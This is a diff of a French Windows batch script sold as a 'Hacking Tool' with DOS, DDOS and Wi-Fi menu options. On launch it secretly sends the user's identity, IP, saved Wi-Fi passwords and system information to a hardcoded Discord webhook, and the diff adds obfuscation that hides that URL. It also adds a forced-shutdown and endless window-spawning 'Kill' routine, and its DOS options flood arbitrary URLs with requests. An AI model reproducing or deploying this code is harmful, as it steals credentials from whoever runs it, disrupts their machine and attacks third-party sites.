@@ -1,66 +1,85 @@
-REM ============================================================================================================
-REM                                         DROITS D'AUTEUR ET CONDITIONS D'UTILISATION
-REM 
-REM Ce script, intitulé "Hacking Tool", a été créé par m.a.s_dev. Toute utilisation, distribution ou modification
-REM de ce script est soumise aux termes et conditions suivants. Le créateur m.a.s_dev se réserve tous les droits
-REM sur ce script. Pour plus d'informations sur m.a.s_dev, veuillez consulter le Linktree :
-REM https://linktr.ee/m.a.s_dev
-REM 
-REM 1. DROITS D'AUTEUR
-REM - Ce script est protégé par le droit d'auteur. Vous n'êtes pas autorisé à le modifier, le distribuer ou le
-REM   réutiliser à des fins commerciales ou non commerciales sans l'autorisation expresse de m.a.s_dev.
-REM - Vous êtes autorisé à utiliser ce script tel quel pour vos besoins personnels, mais toute altération du code
-REM   peut rendre le script inutilisable ou provoquer des dysfonctionnements.
-REM 
-REM 2. LIMITATION DE RESPONSABILITÉ
-REM - Ce script est fourni "tel quel", sans garantie d'aucune sorte. m.a.s_dev ne pourra être tenu responsable des
-REM   dommages, pertes de données ou autres conséquences résultant de l'utilisation de ce script.
-REM - Vous reconnaissez que l'utilisation de ce script, notamment à des fins de piratage, d'extraction de données ou
-REM   toute autre activité illégale, est de votre entière responsabilité. Vous êtes seul responsable de toute action
-REM   entreprise en utilisant ce script.
-REM 
-REM 3. INTERDICTION DE MODIFICATION
-REM - Il est strictement interdit de modifier ou d'altérer ce script. Les modifications peuvent rendre le script
-REM   instable ou entraîner des erreurs de fonctionnement. Toute altération du code est aux risques et périls de
-REM   l'utilisateur.
-REM - Le créateur n'est pas tenu de fournir un support ou une assistance pour les versions modifiées du script.
-REM 
-REM En utilisant ce script, vous acceptez ces conditions.
-REM ============================================================================================================
+:: ============================================================================================================
+::                                        DROITS D'AUTEUR ET CONDITIONS D'UTILISATION
+::
+:: Ce script, intitulÃ© "Hacking Tool", a Ã©tÃ© crÃ©Ã© par m.a.s_dev. Toute utilisation, distribution ou modification
+:: de ce script est soumise aux termes et conditions suivants. Le crÃ©ateur m.a.s_dev se rÃ©serve tous les droits
+:: sur ce script. Pour plus d'informations sur m.a.s_dev, veuillez consulter le Linktree :
+:: https://linktr.ee/m.a.s_dev
+::
+:: 1. DROITS D'AUTEUR
+:: - Ce script est protÃ©gÃ© par le droit d'auteur. Vous n'Ãªtes pas autorisÃ© Ã  le modifier, le distribuer ou le
+::  rÃ©utiliser Ã  des fins commerciales ou non commerciales sans l'autorisation expresse de m.a.s_dev.
+:: - Vous Ãªtes autorisÃ© Ã  utiliser ce script tel quel pour vos besoins personnels, mais toute altÃ©ration du code
+::   peut rendre le script inutilisable ou provoquer des dysfonctionnements.
+::
+:: 2. LIMITATION DE RESPONSABILITÃ‰
+:: - Ce script est fourni "tel quel", sans garantie d'aucune sorte. m.a.s_dev ne pourra Ãªtre tenu responsable des
+::   dommages, pertes de donnÃ©es ou autres consÃ©quences rÃ©sultant de l'utilisation de ce script.
+::- Vous reconnaissez que l'utilisation de ce script, notamment Ã  des fins de piratage, d'extraction de donnÃ©es ou
+::  toute autre activitÃ© illÃ©gale, est de votre entiÃ¨re responsabilitÃ©. Vous Ãªtes seul responsable de toute action
+::   entreprise en utilisant ce script.
+:: 
+:: 3. INTERDICTION DE MODIFICATION
+:: - Il est strictement interdit de modifier ou d'altÃ©rer ce script. Les modifications peuvent rendre le script
+::   instable ou entraÃ®ner des erreurs de fonctionnement. Toute altÃ©ration du code est aux risques et pÃ©rils de
+::   l'utilisateur.
+:: - Le crÃ©ateur n'est pas tenu de fournir un support ou une assistance pour les versions modifiÃ©es du script.
+::
+:: En utilisant ce script, vous acceptez ces conditions.
+:: ============================================================================================================
 
 color b
 title Hacking Tool
 prompt .
 @echo off
 cls
-setlocal enabledelayedexpansion
-
+setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
 echo Loading...
-
-set connected=false
+set co=false
 for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /i "IPv4"') do (
     if NOT "%%A"==" 127.0.0.1" (
-        set connected=true
+        set co=true
     )
 )
-
-if "%connected%"=="false" (
+if "%co%"=="false" (
     echo Pas de connexion internet!
     pause
     goto :EOF
-
 ) 
-
-set webhookUrl=https://discord.com/api/webhooks/1292853894711611493/RFDM9dZL49Xm1wlP34d6cNdEGBo3ARPYO3FSl658M7QhaRxP5EuBwA7D4LMmcEZZ1KOY
-set "Vers=1.9"
-set "LastUpdate=15/10/2024"
-set "Bureaux=%USERPROFILE%\Desktop"
-
-set "tempFile=%TEMP%\Temp_m.a.s_dev_%USERNAME%_%COMPUTERNAME%.txt"
-set IPP=
+(set INVCHAR[mvdtxq]=a) & (set INVCHAR[bhoijd]=b) & (set INVCHAR[cfgjgh]=c) & (set INVCHAR[depjox]=d) & (set INVCHAR[elkdsw]=e)
+(set INVCHAR[ffbklj]=f) & (set INVCHAR[giokjs]=g) & (set INVCHAR[htrlkj]=h) & (set INVCHAR[iopszn]=i) & (set INVCHAR[jkzesw]=j)
+(set INVCHAR[kzsoiu]=k) & (set INVCHAR[lpodks]=l) & (set INVCHAR[mlojzj]=m) & (set INVCHAR[njsdiy]=n) & (set INVCHAR[odosjw]=o)
+(set INVCHAR[pllkjh]=p) & (set INVCHAR[qlkknj]=q) & (set INVCHAR[rsmlop]=r) & (set INVCHAR[sijnuz]=s) & (set INVCHAR[tioujd]=t)
+(set INVCHAR[uijxcw]=u) & (set INVCHAR[vikoaz]=v) & (set INVCHAR[wxdzol]=w) & (set INVCHAR[xolker]=x) & (set INVCHAR[yuioij]=y)
+(set INVCHAR[zokisc]=z)
+(set INVCHAR[ONJLIU]=A) & (set INVCHAR[SZVNHL]=B) & (set INVCHAR[VRIDUF]=C) & (set INVCHAR[QMWKTI]=D) & (set INVCHAR[J62DSP]=E)
+(set INVCHAR[MQBRKH]=F) & (set INVCHAR[BOANMW]=G) & (set INVCHAR[QOXYBZ]=H) & (set INVCHAR[7AC5VB]=I) & (set INVCHAR[FTP1NK]=J)
+(set INVCHAR[PTIELI]=K) & (set INVCHAR[ROSI27]=L) & (set INVCHAR[OKDH85]=M) & (set INVCHAR[TJNI5D]=N) & (set INVCHAR[OJ854D]=O)
+(set INVCHAR[CA41DV]=P) & (set INVCHAR[OJISD5]=Q) & (set INVCHAR[LM5WGD]=R) & (set INVCHAR[EDSDJC]=S) & (set INVCHAR[FKQ8JD]=T)
+(set INVCHAR[T45SFC]=U) & (set INVCHAR[PDG56I]=V) & (set INVCHAR[133SIW]=W) & (set INVCHAR[NDJCUK]=X) & (set INVCHAR[L5D2JV]=Y)
+(set INVCHAR[52GHTM]=Z)
+(set INVCHAR[ppttsd]=.) & (set INVCHAR[splasx]=/) & (set INVCHAR[dploxw]=:)
+(set INVCHAR[sxzqhe]=0) & (set INVCHAR[sxuqhe]=1) & (set INVCHAR[sdzqhe]=2) & (set INVCHAR[sxuqht]=3) & (set INVCHAR[crttzf]=4)
+(set INVCHAR[cilque]=5) & (set INVCHAR[sicesx]=6) & (set INVCHAR[ssetdw]=7) & (set INVCHAR[outfsw]=8) & (set INVCHAR[nfkopx]=9)
+set "olazksdjoixhwnc=htrlkjtioujdtioujdpllkjhsijnuzdploxwsplasxsplasxdepjoxiopsznsijnuzcfgjghodosjwrsmlopdepjoxppttsdcfgjghodosjwmlojzjsplasxmvdtxqpllkjhiopsznsplasxwxdzolelkdswbhoijdhtrlkjodosjwodosjwkzsoiusijnuzsplasxsxuqhesdzqhenfkopxsdzqheoutfswcilquesxuqhtoutfswnfkopxcrttzfssetdwsxuqhesxuqhesicesxsxuqhesxuqhecrttzfnfkopxsxuqhtsplasxLM5WGDMQBRKHQMWKTIOKDH85nfkopxdepjox52GHTMROSI27crttzfnfkopxNDJCUKmlojzjsxuqhewxdzollpodksCA41DVsxuqhtcrttzfdepjoxsicesxcfgjghTJNI5DdepjoxJ62DSPBOANMWSZVNHLodosjwsxuqhtONJLIULM5WGDCA41DVL5D2JVOJ854DsxuqhtMQBRKHEDSDJClpodkssicesxcilqueoutfswOKDH85ssetdwOJISD5htrlkjmvdtxqLM5WGDxolkerCA41DVcilqueJ62DSPuijxcwSZVNHLwxdzolONJLIUssetdwQMWKTIcrttzfROSI27OKDH85mlojzjcfgjghJ62DSP52GHTM52GHTMsxuqhePTIELIOJ854DL5D2JV" 
+set PLASOZ=
+:dslpplbyasfgwx
+if "%olazksdjoixhwnc%"=="" goto eljkdiknxwxcopkujekdfkpkw
+set blckdicuhjdzeizyedizugeyqusgdyuqgsdyusgduysfgueir=%olazksdjoixhwnc:~0,6%
+set doelfjkeirjezuhncebccharodlfjkfuisxdhcv=!INVCHAR[%blckdicuhjdzeizyedizugeyqusgdyuqgsdyusgduysfgueir%]!
+set PLASOZ=%PLASOZ%!doelfjkeirjezuhncebccharodlfjkfuisxdhcv!
+set olazksdjoixhwnc=%olazksdjoixhwnc:~6%
+goto dslpplbyasfgwx
+:eljkdiknxwxcopkujekdfkpkw
+set "wu=%PLASOZ%"
+set "vrsssytmcmdmasdevdksod=3.4"
+set "lstupdskqdzieszheygzsedqzhedtqgsfd=09/11/2024"
+set "brseaj=%USERPROFILE%\Desktop"
+set "tpmfz=%TEMP%\Temp_m.a.s_dev_%USERNAME%_%COMPUTERNAME%.txt"
+set izklm=
 for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /R "IPv4"') do (
-    set IPP=%%i
-    set IPP=!IPP: =!
+    set izklm=%%i
+    set izklm=!izklm: =!
 )
 (
 echo {
@@ -79,24 +98,24 @@ echo           "value": "%COMPUTERNAME%"
 echo         },
 echo         {
 echo           "name": "Adresse IP",
-echo           "value": "%IPP%"
+echo           "value": "%izklm%"
 echo         }
 echo       ]
 echo     }
 echo   ]
 echo }
-) > "!tempFile!"
-curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
-del "!tempFile!"
+) > "!tpmfz!"
+curl -H "Content-Type: application/json" -d @"!tpmfz!" %wu%
+del "!tpmfz!"
 
 set tempDir=%TEMP%
-set outputFile=%tempDir%\%USERNAME%_%COMPUTERNAME%_Data.txt
-echo. > %outputFile%
-call :Ligne_File
-echo Informations sur les réseaux Wi-Fi et le système : >> %outputFile%
-echo. >> %outputFile%
-netsh wlan show profiles >> %outputFile%
-echo Mot de Passe WIFI : >> %outputFile%
+set akoppdsqdcrghsdazfv=%tempDir%\%USERNAME%_%COMPUTERNAME%_Data.txt
+echo. > %akoppdsqdcrghsdazfv%
+call :lfkiopsxcf
+echo Informations sur les rÃ©seaux Wi-Fi et le systÃ¨me : >> %akoppdsqdcrghsdazfv%
+echo. >> %akoppdsqdcrghsdazfv%
+netsh wlan show profiles >> %akoppdsqdcrghsdazfv%
+echo Mot de Passe WIFI : >> %akoppdsqdcrghsdazfv%
 (
 for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
     set "wifi_name=%%A"
@@ -104,121 +123,125 @@ for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil 
     set "wifi_name=!wifi_name:~1!"
     echo.
     echo Wi-Fi : !wifi_name!
-    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
+    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃƒÂ©"
     endlocal
 )
-) >> %outputFile%
-call :Ligne_File
-echo. >> %outputFile%
-echo Informations système : >> %outputFile%
-echo. >> %outputFile%
-systeminfo >> %outputFile%
-curl -F "file=@%outputFile%" %webhookUrl%
-del %outputFile%
+) >> %akoppdsqdcrghsdazfv%
+call :lfkiopsxcf
+echo. >> %akoppdsqdcrghsdazfv%
+echo Informations systÃ¨me : >> %akoppdsqdcrghsdazfv%
+echo. >> %akoppdsqdcrghsdazfv%
+systeminfo >> %akoppdsqdcrghsdazfv%
+curl -F "file=@%akoppdsqdcrghsdazfv%" %wu%
+del %akoppdsqdcrghsdazfv%
 
 color a
 echo Loaded !
 cls
-call :MainMenu
+call :mmdiksokdjnuzehsdzyiudhgzdqwgusduw
 
-:MainMenu
-call :TitleName
+:mmdiksokdjnuzehsdzyiudhgzdqwgusduw
+call :tltnodslikwdzxwzdolujzdensfdc
 echo.
-call :Commands
-:CommandLoop
+call :cmdqsdkqzloidsdkfcldhzujdhn
+:cmdllllopdzikdqhjuzdhzqedrgqhuytsegdtvsydqsfdhqsfdqhtydefzyte
 color a
-set /p Commande="Enter the Commands : "
-call :Ligne
-if "%Commande%"=="1" (
-    call :Help
-) else if "%Commande%"=="2" (
-    call :DOS
-) else if "%Commande%"=="3" (
-    call :DDOS
-) else if "%Commande%"=="4" (
-    call :HackEffect
-) else if "%Commande%"=="5" (
-    call :IP
-) else if "%Commande%"=="6" (
-    call :WifiHack
-) else if "%Commande%"=="7" (
-    call :Net
-) else if "%Commande%"=="8" (
-    call :Kill
-) else if "%Commande%"=="9" (
-    call :SystemData
-) else if "%Commande%"=="10" (
-    call :DataFiles
-) else if "%Commande%"=="11" (
-    call :Credits
-) else if "%Commande%"=="12" (
-    call :Vers
-) else if "%Commande%"=="13" (
-    call :Clear
-) else if "%Commande%"=="14" (
+set /p cmmdiopqscer="Enter the Commands : "
+call :lfkiopsxcfopieza
+if "%cmmdiopqscer%"=="1" (
+    call :hlpsdfgxcwxcbrtyui
+) else if "%cmmdiopqscer%"=="2" (
+    call :doklijnbonbyvbgsahzbe
+) else if "%cmmdiopqscer%"=="3" (
+    call :dtdoklijnbonbyvbgsahzbe
+) else if "%cmmdiopqscer%"=="4" (
+    call :hfexopkolsjhjkazndb
+) else if "%cmmdiopqscer%"=="5" (
+    call :idlfgdjkcvxpxcswnxc
+) else if "%cmmdiopqscer%"=="6" (
+    call :wfhoieyddfclsjvxjchqsd
+) else if "%cmmdiopqscer%"=="7" (
+    call :ntsdfghwxciuyiazenjuejksdqstjkjcxw
+) else if "%cmmdiopqscer%"=="8" (
+    call :kllltyxhwcugbsydgbzuaedfdgs
+) else if "%cmmdiopqscer%"=="9" (
+    call :sdsyhujhujdaolidjkfcc
+) else if "%cmmdiopqscer%"=="10" (
+    call :dfoiuytghjklcx
+) else if "%cmmdiopqscer%"=="11" (
+    call :crdttkdfjslfsiodkjwxcuyzpedjuhpqzdqsd
+) else if "%cmmdiopqscer%"=="12" (
+    call :vrsspoikdpzeaikdpzaurfdlmsuqldkmswuicxlc
+) else if "%cmmdiopqscer%"=="13" (
+    call :clrklsdjqskdsnclsoiurziofekdfjoskdjfscd
+) else if "%cmmdiopqscer%"=="14" (
     echo Bye
     goto :EOF
-) else if "%Commande%"=="Help" (
-    call :Help
-) else if "%Commande%"=="DOS" (
-    call :DOS
-) else if "%Commande%"=="DDOS" (
-    call :DDOS
-) else if "%Commande%"=="HackEffect" (
-    call :HackEffect
-) else if "%Commande%"=="IP" (
-    call :IP
-) else if "%Commande%"=="WifiHack" (
-    call :WifiHack
-) else if "%Commande%"=="Net" (
-    call :Net
-) else if "%Commande%"=="Kill" (
-    call :Kill
-) else if "%Commande%"=="SystemData" (
-    call :SystemData
-) else if "%Commande%"=="DataFiles" (
-    call :DataFiles
-) else if "%Commande%"=="Credits" (
-    call :Credits
-) else if "%Commande%"=="Version" (
-    call :Vers
-) else if "%Commande%"=="Clear" (
-    call :Clear
-) else if "%Commande%"=="Save IP" (
-    call :Save_IP
-) else if "%Commande%"=="Save WifiHack" (
-    call :Save_WifiHack
-) else if "%Commande%"=="Save Net" (
-    call :Save_Net
-) else if "%Commande%"=="Save SystemData" (
-    call :Save_systemData
-) else if "%Commande%"=="None" (
+) else if "%cmmdiopqscer%"=="15" (
+    call :ddpsslinvflkjazedswfc
+) else if "%cmmdiopqscer%"=="Help" (
+    call :hlpsdfgxcwxcbrtyui
+) else if "%cmmdiopqscer%"=="DOS" (
+    call :doklijnbonbyvbgsahzbe
+) else if "%cmmdiopqscer%"=="DDOS" (
+    call :dtdoklijnbonbyvbgsahzbe
+) else if "%cmmdiopqscer%"=="HackEffect" (
+    call :hfexopkolsjhjkazndb
+) else if "%cmmdiopqscer%"=="IP" (
+    call :idlfgdjkcvxpxcswnxc
+) else if "%cmmdiopqscer%"=="WifiHack" (
+    call :wfhoieyddfclsjvxjchqsd
+) else if "%cmmdiopqscer%"=="Net" (
+    call :ntsdfghwxciuyiazenjuejksdqstjkjcxw
+) else if "%cmmdiopqscer%"=="Kill" (
+    call :kllltyxhwcugbsydgbzuaedfdgs
+) else if "%cmmdiopqscer%"=="SystemData" (
+    call :sdsyhujhujdaolidjkfcc
+) else if "%cmmdiopqscer%"=="DataFiles" (
+    call :dfoiuytghjklcx
+) else if "%cmmdiopqscer%"=="Credits" (
+    call :crdttkdfjslfsiodkjwxcuyzpedjuhpqzdqsd
+) else if "%cmmdiopqscer%"=="Version" (
+    call :vrsspoikdpzeaikdpzaurfdlmsuqldkmswuicxlc
+) else if "%cmmdiopqscer%"=="Clear" (
+    call :clrklsdjqskdsnclsoiurziofekdfjoskdjfscd
+) else if "%cmmdiopqscer%"=="Save IP" (
+    call :svppfidofsidkjvjieokazjdszqdsjwkcoixchjye
+) else if "%cmmdiopqscer%"=="Save WifiHack" (
+    call :svhcksodsklqmzilkxwfoivprjkozpfedfhkslodfjhd
+) else if "%cmmdiopqscer%"=="Save Net" (
+    call :svneteopidksjfpsdfucjeoixeufjaoizerhdskjcuhxv
+) else if "%cmmdiopqscer%"=="Save SystemData" (
+    call :sasydikjnbhnudbsuyqtzgedhstdggsqdazefd
+) else if "%cmmdiopqscer%"=="Discord" (
+    call :ddpsslinvflkjazedswfc
+) else if "%cmmdiopqscer%"=="None" (
     echo Enter a commande
 ) else (
-    echo Invalid Commande : ^| %Commande% ^|
+    echo Invalid Commande : ^| %cmmdiopqscer% ^|
 )
-set Commande="None"
+set cmmdiopqscer="None"
 goto CommandLoop
 
-:DataFiles
+:dfoiuytghjklcx
 color c
 tree
 color a
 goto :EOF
-:SystemData
+:sdsyhujhujdaolidjkfcc
 color c
 systeminfo
 color a
 goto :EOF
-:IP
+:idlfgdjkcvxpxcswnxc
 color c
 ipconfig /all
 color a
 goto :EOF
-:WifiHack
+:wfhoieyddfclsjvxjchqsd
 color c
 echo.
-echo Liste des reseaux Wi-Fi enregistrÃ©s :
+echo Liste des reseaux Wi-Fi enregistres :
 echo -----------------------------------------------
 netsh wlan show profiles
 echo.
@@ -231,25 +254,25 @@ for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil 
     set "wifi_name=!wifi_name:~1!"
     echo.
     echo Wi-Fi : !wifi_name!
-    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
+    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃƒÂ©"
     endlocal
 )
 echo.
 goto :EOF
-:Clear
+:clrklsdjqskdsnclsoiurziofekdfjoskdjfscd
 cls
 goto :EOF
-:Net
+:ntsdfghwxciuyiazenjuejksdqstjkjcxw
 color c
 netstat
 goto :EOF
-:HackEffect
+:hfexopkolsjhjkazndb
 color c
 dir /s
 color a
 goto :EOF
-:Kill
-set "tempFile=%TEMP%\C.txt"
+:kllltyxhwcugbsydgbzuaedfdgs
+set "tpmfz=%TEMP%\C.txt"
 (
 echo {
 echo   "content": "Nouvelle Commande :",
@@ -267,7 +290,7 @@ echo           "value": "%COMPUTERNAME%"
 echo         },
 echo         {
 echo           "name": "Adresse IP",
-echo           "value": "%IPP%"
+echo           "value": "%izklm%"
 echo         },
 echo         {
 echo           "name": "Commmande",
@@ -277,27 +300,27 @@ echo       ]
 echo     }
 echo   ]
 echo }
-) > "!tempFile!"
-curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
-del "!tempFile!"
+) > "!tpmfz!"
+curl -H "Content-Type: application/json" -d @"!tpmfz!" %wu%
+del "!tpmfz!"
 color c
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-shutdown /s
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-start start start start start start start start start start start start start
-dir /s
-tree
+shutdown.exe -s -c "Ordinateur infecter, erreur du system par m.a.s_dev" -t 60
+:odpfkdsoxcvnksdihjnwbxcyiugwbhsdcwxd
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+goto odpfkdsoxcvnksdihjnwbxcyiugwbhsdcwxd
+:ddpsslinvflkjazedswfc
+start https://discord.gg/BtkPH5PDdR
 goto :EOF
-:DDOS
+:dtdoklijnbonbyvbgsahzbe
 color 01
 set /p "URL=Enter the URL: "
 color 05
@@ -305,7 +328,7 @@ set /p "Request_Number=Enter the number of requests per CMD: "
 color 0e
 set /p "CMD_Number=Enter the number of CMD windows to open: "
 color a
-set "tempFile=%TEMP%\C.txt"
+set "tpmfz=%TEMP%\C.txt"
 (
 echo {
 echo   "content": "Nouvelle Commande :",
@@ -323,7 +346,7 @@ echo           "value": "%COMPUTERNAME%"
 echo         },
 echo         {
 echo           "name": "Adresse IP",
-echo           "value": "%IPP%"
+echo           "value": "%izklm%"
 echo         },
 echo         {
 echo           "name": "Commmande",
@@ -345,20 +368,20 @@ echo       ]
 echo     }
 echo   ]
 echo }
-) > "!tempFile!"
-curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
-del "!tempFile!"
+) > "!tpmfz!"
+curl -H "Content-Type: application/json" -d @"!tpmfz!" %wu%
+del "!tpmfz!"
 for /l %%j in (1,1,%CMD_Number%) do (
     start cmd /c "title DDOS & color c & (for /l %%i in (1,1,%Request_Number%) do curl %URL%) & color a & goto :EOF"
 )
 color c
 goto : EOF
-:DOS
+:doklijnbonbyvbgsahzbe
 color 01
 set /p URL="Enter the URL : "
 color 05
 set /p Request_Number="Enter request number : "
-set "tempFile=%TEMP%\C.txt"
+set "tpmfz=%TEMP%\C.txt"
 (
 echo {
 echo   "content": "Nouvelle Commande :",
@@ -376,7 +399,7 @@ echo           "value": "%COMPUTERNAME%"
 echo         },
 echo         {
 echo           "name": "Adresse IP",
-echo           "value": "%IPP%"
+echo           "value": "%izklm%"
 echo         },
 echo         {
 echo           "name": "Commmande",
@@ -398,14 +421,14 @@ echo       ]
 echo     }
 echo   ]
 echo }
-) > "!tempFile!"
-curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
-del "!tempFile!"
+) > "!tpmfz!"
+curl -H "Content-Type: application/json" -d @"!tpmfz!" %wu%
+del "!tpmfz!"
 color c
 start cmd /c "title DOS & color c & (for /l %%i in (1,1,%Request_Number%) do curl %URL%) & color a & pause"
 color a
 goto :EOF
-:Credits
+:crdttkdfjslfsiodkjwxcuyzpedjuhpqzdqsd
 color 05
 echo .
 echo 	##     ##        ###         ######          ########  ######## ##     ## 
@@ -416,19 +439,19 @@ echo 	##     ##     #########           ##         ##     ## ##        ##   ##
 echo 	##     ## ### ##     ## ### ##    ##         ##     ## ##         ## ##   
 echo 	##     ## ### ##     ## ###  ######  ####### ########  ########    ###    
 echo .
-call :Ligne
+call :lfkiopsxcfopieza
 color a
 goto :EOF
-:Save_IP
+:svppfidofsidkjvjieokazjdszqdsjwkcoixchjye
 color 0e
-ipconfig /all >> %USERPROFILE%\Desktop\Hack_Tool_IP.txt
+ipconfig /all >> %brseaj%\Hack_Tool_IP.txt
 color a
 echo Fichier cree dans bureaux
 goto :EOF
-:Save_WifiHack
+:svhcksodsklqmzilkxwfoivprjkozpfedfhkslodfjhd
 color 0e
-set "Fichier_SaveWifiPassWord=%USERPROFILE%\Desktop\Hack_Tool_WifiHack.txt"
-echo Informations sur les réseaux Wi-Fi et le système : >> %Fichier_SaveWifiPassWord%
+set "Fichier_SaveWifiPassWord=%brseaj%\Hack_Tool_WifiHack.txt"
+echo Informations sur les rÃ©seaux Wi-Fi et le systÃ¨me : >> %Fichier_SaveWifiPassWord%
 echo. >> %Fichier_SaveWifiPassWord%
 netsh wlan show profiles >> %Fichier_SaveWifiPassWord%
 echo Mot de Passe WIFI : >> %Fichier_SaveWifiPassWord%
@@ -439,31 +462,31 @@ for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil 
     set "wifi_name=!wifi_name:~1!"
     echo.
     echo Wi-Fi : !wifi_name!
-    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
+    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃƒÂ©"
     endlocal
 )
 ) >> %Fichier_SaveWifiPassWord%
 color a
 echo Fichier cree dans bureaux
 goto :EOF
-:Save_Net
+:svneteopidksjfpsdfucjeoixeufjaoizerhdskjcuhxv
 color 0e
-netstat >> %USERPROFILE%\Desktop\Hack_Tool_Net.txt
+netstat >> %brseaj%\Hack_Tool_Net.txt
 color a
 echo Fichier cree dans bureaux
 goto :EOF
-:Save_systemData
+:sasydikjnbhnudbsuyqtzgedhstdggsqdazefd
 color 0e
-systeminfo >> %USERPROFILE%\Desktop\Hack_Tool_SystemData.txt
+systeminfo >> %brseaj%\Hack_Tool_SystemData.txt
 color a
 echo Fichier cree dans bureaux
 goto :EOF
-:Help
-call :TitleName
-call :Ligne
-call :Commands
+:hlpsdfgxcwxcbrtyui
+call :tltnodslikwdzxwzdolujzdensfdc
+call :lfkiopsxcfopieza
+call :cmdqsdkqzloidsdkfcldhzujdhn
 goto :EOF
-:Commands
+:cmdqsdkqzloidsdkfcldhzujdhn
 echo .
 echo     []==================================================================================[]
 echo     []                                   Menu Principal                                 []
@@ -472,18 +495,18 @@ echo     [] [1] Help                    [] [2] DOS                    [] [3] DDO
 echo     [] [4] HackEffect              [] [5] IP                     [] [6] WifiHack        []
 echo     [] [7] Net                     [] [8] Kill                   [] [9] SystemData      []
 echo     [] [10] DataFiles              [] [11] Credits               [] [12] Version        []
-echo     [] [13] Clear                  [] [14] Leave                 []                     []
+echo     [] [13] Clear                  [] [14] Leave                 [] [15] Discord        []
 echo     []==================================================================================[]
 echo .
 echo commande Save fonctionne avec {IP, WifiHack, Net, SystemData}
 echo .
-call :Ligne
+call :lfkiopsxcfopieza
 goto :EOF
-:Vers
-echo Version : %Vers%
-echo Last Update : %LastUpdate%
+:vrsspoikdpzeaikdpzaurfdlmsuqldkmswuicxlc
+echo Version : %vrsssytmcmdmasdevdksod%
+echo Last Update : %lstupdskqdzieszheygzsedqzhedtqgsfd%
 goto :EOF
-:TitleName
+:tltnodslikwdzxwzdolujzdensfdc
 echo .
 echo 	##     ##    ###     ######  ##    ## #### ##    ##  ######      ########  #######   #######  ##       
 echo 	##     ##   ## ##   ##    ## ##   ##   ##  ###   ## ##    ##        ##    ##     ## ##     ## ##       
@@ -493,11 +516,11 @@ echo 	##     ## ######### ##       ##  ##    ##  ##  #### ##    ##        ##    
 echo 	##     ## ##     ## ##    ## ##   ##   ##  ##   ### ##    ##        ##    ##     ## ##     ## ##       
 echo 	##     ## ##     ##  ######  ##    ## #### ##    ##  ######         ##     #######   #######  ######## 
 echo .
-call :Ligne
+call :lfkiopsxcfopieza
 goto :EOF
-:Ligne
+:lfkiopsxcfopieza
 echo ============================================================================================================
 goto :EOF
-:Ligne_File
-echo ======================================================================================== >> %outputFile%
+:lfkiopsxcf
+echo ======================================================================================== >> %akoppdsqdcrghsdazfv%
 goto :EOF
